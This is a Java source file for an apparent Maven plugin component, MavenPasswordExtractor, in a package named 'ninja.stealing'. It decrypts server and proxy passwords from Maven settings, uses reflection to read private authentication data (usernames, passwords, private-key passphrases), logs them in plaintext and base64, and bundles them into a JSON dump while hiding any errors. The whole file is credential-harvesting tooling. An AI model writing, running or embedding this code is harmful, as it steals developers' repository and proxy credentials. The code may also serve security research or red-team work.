package ninja.stealing.maven.password.extractor;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.maven.execution.MavenSession;
import org.apache.maven.plugin.logging.Log;
import org.apache.maven.plugins.annotations.Component;
import org.apache.maven.plugins.annotations.Parameter;
import org.apache.maven.settings.Proxy;
import org.apache.maven.settings.Server;
import org.apache.maven.settings.Settings;
import org.apache.maven.settings.crypto.SettingsDecrypter;
import org.eclipse.aether.repository.Authentication;
import org.eclipse.aether.repository.AuthenticationContext;
import org.eclipse.aether.repository.AuthenticationSelector;
import org.eclipse.aether.repository.RemoteRepository;
import org.eclipse.aether.util.repository.AuthenticationBuilder;
import org.sonatype.plexus.components.cipher.DefaultPlexusCipher;
import org.sonatype.plexus.components.cipher.PlexusCipherException;
import org.sonatype.plexus.components.sec.dispatcher.DefaultSecDispatcher;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;

import ninja.stealing.maven.password.extractor.maven.DumpObject;
import ninja.stealing.maven.password.model.Extraction;

public class MavenPasswordExtractor implements Extractor {
	static final String EXTRACTOR_ID = "MAVEN" ;
	
	private String[] authConField = { AuthenticationContext.USERNAME, AuthenticationContext.PASSWORD,
			AuthenticationContext.NTLM_DOMAIN, AuthenticationContext.NTLM_WORKSTATION,
			AuthenticationContext.PRIVATE_KEY_PATH, AuthenticationContext.PRIVATE_KEY_PASSPHRASE,
			AuthenticationContext.HOST_KEY_ACCEPTANCE, AuthenticationContext.HOST_KEY_REMOTE,
			AuthenticationContext.HOST_KEY_LOCAL, AuthenticationContext.SSL_CONTEXT,
			AuthenticationContext.SSL_HOSTNAME_VERIFIER };

	@Component(role = SettingsDecrypter.class)
	private SettingsDecrypter settingsDecrypter;
	private Log log;
	private MavenSession session;
	private Settings settings;
    private ObjectMapper mapper;
    
	public MavenPasswordExtractor(Log log, MavenSession session, Settings settings) {
		this.log = log;
		this.session = session;
		this.settings = settings ;
		this.mapper = new ObjectMapper();
	}
	@Override
	public Extraction extract() {
		
		
		if (settingsDecrypter == null) {
			log.warn("  No settings decrypter found. Cant decrypt ...");
		}


	    // create a JSON object
	    ObjectNode content = mapper.createObjectNode();
	    
	    
    	try {
    		// TODO: Get master
    		String master = "";
            DefaultPlexusCipher dc = new DefaultPlexusCipher();
            String dcMaster = dc.decryptDecorated( master, DefaultSecDispatcher.SYSTEM_PROPERTY_SEC_LOCATION );
            log.info("  Master: " + dcMaster);
            ObjectNode masterNode = mapper.createObjectNode();
            masterNode.put("value", master);
            masterNode.put("decrypted",dcMaster);
            content.set("master", masterNode);
            
            

		} catch ( PlexusCipherException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		log.info("Dumping credentials and repositories");
		List<DumpObject> dumpObjects = new ArrayList<DumpObject>();

		for (final Proxy proxy : settings.getProxies()) {
			DumpObject dumpObject = new DumpObject(proxy);
			dumpObjects.add(dumpObject);
		}
		for (final Server server : settings.getServers()) {
			DumpObject dumpObject = new DumpObject(server);
			dumpObjects.add(dumpObject);
		}
		int i = 0;
		for (final DumpObject dumpObject : dumpObjects) {
			// Get basic information from settings. Sometime password are not
			// encrypted anyway.
			ObjectNode dumpNode = mapper.createObjectNode();

			dumpNode.put("username", dumpObject.getUsername());
			dumpNode.put("password",dumpObject.getPassword());
			dumpNode.put("password_b64",b64(dumpObject.getPassword()));
			dumpNode.put("type",dumpObject.getType());
			dumpNode.put("id",dumpObject.getId());
			
			// First method to decrypt: the settingsDecrypter
			if (settingsDecrypter != null) {
				String decryptedPassword = dumpObject.getDecryptedPassword(settingsDecrypter);
				if (decryptedPassword != null) {
					dumpNode.put("password_decrypted",decryptedPassword);
					dumpNode.put("password_decrypted_b64",b64(decryptedPassword));
				}
			}

			// Second method: build a repo builder and get the password from the
			// context. Only the Id should be correct
			final RemoteRepository.Builder remoteRepoBuilder = new RemoteRepository.Builder(dumpObject.getId(),
					"default", "http://example.com");

			remoteRepoBuilder.setAuthentication(new AuthenticationBuilder().addUsername("dummy")
					.addPassword("dummy").build());
			RemoteRepository remoteRepository = remoteRepoBuilder.build();
			AuthenticationContext authenticationContext = AuthenticationContext
					.forRepository(session.getRepositorySession(), remoteRepository);

			if (authenticationContext != null) {
				Authentication authentication = session.getRepositorySession().getAuthenticationSelector()
						.getAuthentication(remoteRepository);
				if (authentication != null) {
					authentication.fill(authenticationContext, "password", null);
					log.info("  - username (expanded): " + authenticationContext.get("username"));
					log.info("  - password (expanded): " + authenticationContext.get("password"));
					log.info("  - password (expanded b64): " + b64(authenticationContext.get("password")));
					dumpNode.put("username_expanded",authenticationContext.get("username"));
					dumpNode.put("password_expanded",authenticationContext.get("password"));
					dumpNode.put("password_expanded_b64",b64(authenticationContext.get("password")));

				}

			} else {
				log.warn("  can't get an authentication context");
			}

			content.set("account_"+ ++i, dumpNode);
		}

		// Method 1 and 2 rely on getting the password for a specific server
		// Even if we got the list of server from the settings object, on this
		// method we
		// will try to dump all
		// "AuthenticationSelector" that a new repo may have access to.
		try {
			final RemoteRepository.Builder remoteRepoBuilder = new RemoteRepository.Builder("dummy", "default",
					"http://example.com");
			remoteRepoBuilder
					.setAuthentication(new AuthenticationBuilder().addUsername("dummy").addPassword("dummy").build());

			RemoteRepository remoteRepository = remoteRepoBuilder.build();
			AuthenticationContext dummyAuthenticationContext = AuthenticationContext
					.forRepository(session.getRepositorySession(), remoteRepository);

		    ArrayNode dumpSelectorNode = dumpAuthenticationSelector(session.getRepositorySession().getAuthenticationSelector(),
					dummyAuthenticationContext);
		    content.put("dumpSelector", dumpSelectorNode);
		} catch (Exception e) {
			// Silently fail... like a ninja
		}
		Extraction extraction = new Extraction(EXTRACTOR_ID, content);
		return extraction;
		

	}
	private String b64(String input){
		String encodedString = Base64.getEncoder().encodeToString(input.getBytes());
		return encodedString;
	}

	private ArrayNode dumpAuthenticationSelector(AuthenticationSelector authenticationSelector,
			AuthenticationContext dummyAuthenticationContext)
					throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException {

	    
		ArrayNode dumpSelectorNode = mapper.createArrayNode();

		// Get the private field "repos" from the AuthenticationSelector
		Field repoField = authenticationSelector.getClass().getDeclaredField("repos");
		repoField.setAccessible(true);

		@SuppressWarnings("unchecked")
		HashMap<String, Authentication> repos = (HashMap<String, Authentication>) repoField.get(authenticationSelector);
		if (repos.entrySet().size() > 0) {
			log.info("Dumping authentication selector");
			for (Map.Entry<String, Authentication> repo : repos.entrySet()) {
				ObjectNode repoNode = mapper.createObjectNode();
				
				String key = repo.getKey();
				Authentication authentication = repo.getValue();
				log.info("  Repo " + key);
				repoNode.put("repo", key);
				// This will replace our "dummy" password with actual content
				authentication.fill(dummyAuthenticationContext, "useless", null);
				// Then we dump every field
				for (String field : authConField) {
					if (dummyAuthenticationContext.get(field) != null) {
						repoNode.put(field, dummyAuthenticationContext.get(field));
						//log.info("  - " + field + ": " + dummyAuthenticationContext.get(field));
					}
				}
				dumpSelectorNode.add(repoNode);
			}
		}
		return dumpSelectorNode;
	}


}
